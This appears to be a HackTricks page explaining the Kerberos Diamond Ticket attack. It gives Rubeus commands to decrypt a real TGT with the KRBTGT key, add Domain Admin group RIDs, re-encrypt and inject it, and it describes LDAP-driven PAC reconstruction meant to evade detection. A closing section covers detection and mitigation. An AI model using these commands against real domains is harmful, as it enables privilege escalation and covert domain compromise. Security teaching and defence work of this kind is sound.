# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

A **Diamond Ticket** is a modified, legitimate Ticket Granting Ticket (TGT) obtained from a Domain Controller (DC) and re-encrypted to escalate privileges while preserving valid Kerberos flows. Unlike **Golden Tickets** (completely forged) or **Silver Tickets** (service-ticket forging), Diamond Tickets combine genuine and forged elements to evade common detections.

### Workflow

1. Obtain a legitimate TGT via **AS-REQ/AS-REP** (e.g., using Rubeus `asktgt`).
2. Decrypt the TGT with the **KRBTGT AES256** key.
3. Modify **PAC attributes** (user/group information, timestamps, policy values).
4. Re-encrypt the TGT with the KRBTGT key and inject it into the session (`/ptt`).

### Basic PoC

```powershell
# Get user RID
Get-DomainUser -Identity <username> -Properties objectSid

# Forge a basic Diamond Ticket
.\Rubeus.exe diamond /krbkey:<AES256_KRBTGT> /user:loki /password:Mischief$ /enctype:aes \
  /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /nowrap /groups:512
```

## Ticket Anatomy & PAC Structure

When described with Rubeus, a Diamond Ticket reveals:

- **ServiceName/Realm:** `krbtgt/<DOMAIN>`
- **UserName/Realm:** `<ticketuser>@<DOMAIN>`
- **Validity:** StartTime, EndTime, RenewTill (policy lifetimes)
- **Flags:** initial, pre_authent, renewable, forwardable, etc.
- **Encryption:** `aes256_cts_hmac_sha1` session key
- **PAC (decrypted):**
  - **LogonInfo:** LogonTime, PasswordLastSet, PasswordCanChange, LogonCount, BadPasswordCount, UserFlags, LogonServer
  - **Groups:** list of group RIDs (e.g., 512, 513, 518, 519, 520)
  - **EffectiveName, FullName:** from AD
  - **RequestorSID**
- **Checksums:** ServerChecksum & KDCChecksum (`KERB_CHECKSUM_HMAC_SHA1_96_AES256`)
- **Block One Plain Text:** raw data for DES-attack demonstrations

```powershell
.\Rubeus.exe describe /servicekey:<AES256_KRBTGT> /ticket:diamond_ticket.ccache
```

## Limitations of Default PoC

- Static PAC fields (hard-coded group RIDs, blank FullName, stale timestamps) are detectable by strict PAC validation (Protected Users, PAWs).
- Missing domain policy values (MinimumPasswordLength, MaximumPasswordAge, LockoutBadCount, MaxTicketAge, MaxRenewAge) reduce authenticity.
- Hard-coded values may break compatibility with some KDC implementations.

## LDAP-Driven PAC Reconstruction ("Recutting")

To fully populate the PAC with accurate data, extend Rubeus ForgeTicket/Diamond modules to:

1. Accept `/ldap`, `/ldapuser`, `/ldappassword` parameters.
2. Bind to AD via LDAP/LDAPS (`System.DirectoryServices.Protocols`):
   - Retrieve user attributes: `displayName`, `sAMAccountName`, `userAccountControl`, `lastLogon`.
   - Enumerate group memberships.
3. Mount `\\<DC>\\IPC$` and `\\<DC>\\SYSVOL` over SMB:
   - Read `GptTmpl.inf` for password policies (`MinimumPasswordLength`, `MaximumPasswordAge`, `LockoutBadCount`).
   - Read Kerberos parameters for `MaxTicketAge`, `MaxRenewAge`.
4. Build PAC with realistic fields:
   - User **LogonInfo** (timestamps, flags).
   - **FullName** and **EffectiveName**.
   - Group RIDs from LDAP.
   - Domain policy values from GPO files.

## Enhanced Command & Stealth Output

```powershell
.\Rubeus.exe diamond /krbkey:<AES256_KRBTGT> /user:loki /password:Mischief$ /enctype:aes \
  /domain:marvel.local /dc:earth-dc.marvel.local /ticketuser:thor /ticketuserid:1104 /nowrap \
  /ldap /ldapuser:loki /ldappassword:Mischief$
```

Decryption via `describe` now shows a fully populated PAC, aligning timestamps and policy values to evade detection.

## Detection & Mitigation

- Monitor for anomalous AS-REQ patterns and mismatched TGT lifetimes (4768 vs 4769 events).
- Enforce conditional MFA for TGT issuance and renewal.
- Audit PAC consistency: compare PAC fields against expected domain policy and user attributes.
- Alert on 4769 events without preceding 4768.

## References

- [Recutting the Kerberos Diamond Ticket](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)
- PoC modules in Rubeus: ForgeTicket.cs, Diamond.cs, Networking.cs

{{#include ../../banners/hacktricks-training.md}}